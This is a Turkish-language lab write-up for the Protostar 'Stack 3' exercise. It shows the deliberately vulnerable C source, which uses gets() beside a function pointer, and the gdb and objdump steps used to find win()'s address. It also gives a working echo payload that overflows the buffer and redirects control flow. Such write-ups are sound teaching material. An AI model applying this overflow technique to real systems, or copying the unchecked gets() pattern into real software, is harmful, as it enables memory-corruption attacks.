---
title: "Stack 3"
etiketler : "Protostar"
seriler: "Protostar"
sakla  : false
---

# Stack3.c
``` C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

**Amaç:** main fonksiyonu içerisinde çağırılmayan bir fonksiyonu değişkenin
değeri değiştirilerek programın akışına manipüle etmek.

# Programın Çalıştırılması
``` text
user@protostar:/opt/protostar/bin$ ./stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # 64 Tane A
user@protostar:/opt/protostar/bin$ ./stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
calling function pointer, jumping to 0x43434343
Segmentation fault
```

Program çalıştırıldığı zaman kullanıcıdan bir giriş bekliyor. Buffer değişkeni
64 byte olduğu için 64byte uzunluğunda bir karakter dizesi verererek programı
incelemeye başlıyorum.

``` C
volatile int (*fp)(); /* Fonksiyon Pointerin tanımlanması */
...
fp = 0; /* Fonksiyon adresi olarak 0 atanması */
```

Öncelikle fp fonksiyon pointeri main fonksiyonunda çağırıldığı için fp
değişkenini istediğimiz fonksiyonun adresi ile değiştirebilirsek programın
akışını değiştirebiliriz. fp main fonksiyonu içinde lokal değişken olarak
tanımlandıkğı için stack taşırılarak fp değişkeni değiştirilebilir. fp 4 byte
olduğu için 4 adet C karakteri ekleyerek fp fonksiyonu çağırıldığında 0 yerine
`0x434343` adresindeki kodun çalıştırmasını bekliyorum.

``` C
user@protostar:/opt/protostar/bin$ ./stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
calling function pointer, jumping to 0x43434343
Segmentation fault
```

Ekrana `calling function pointer, jumping to 0x43434343` yazdırıldığına göre
programın akışını değiştirdik fakat o adrese erişim yetkimiz olmadığı için
`Segmentation fault` hatası aldık. Geriye sadece zıplamak istediğimiz
fonksiyonun adresini bulmak kaldı.

Programın dönüş adresini bulabilmek için `objdump` aracını ve `gdb` kullanımı
aşağıdaki gibidir.

# win Fonksiyonunun Adresinin Bulunması

## Objdump

``` shell
user@protostar:/opt/protostar/bin$ objdump -S stack3 | grep win
08048424 <win>:
```

## GDB
```
user@protostar:/opt/protostar/bin$ gdb ./stack3
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
(gdb) x win
0x8048424 <win>:        0x83e58955
```

Görünüşe göre win fonksiyonunun adresi `08048424`

# Programın Akışının Değiştirilmesi

Programa verdiğim 64 adet "A" karakteirnin sonuna bu adresi ekliyorum.

```
user@protostar:/opt/protostar/bin$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x24\x84\x04\x08" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

Böylelikle stackteki `fp` değişkenini 0 değerinden `08048424` değerine döndürüp
bu adresteki fonksiyonu çalıştırabiliyoruz.
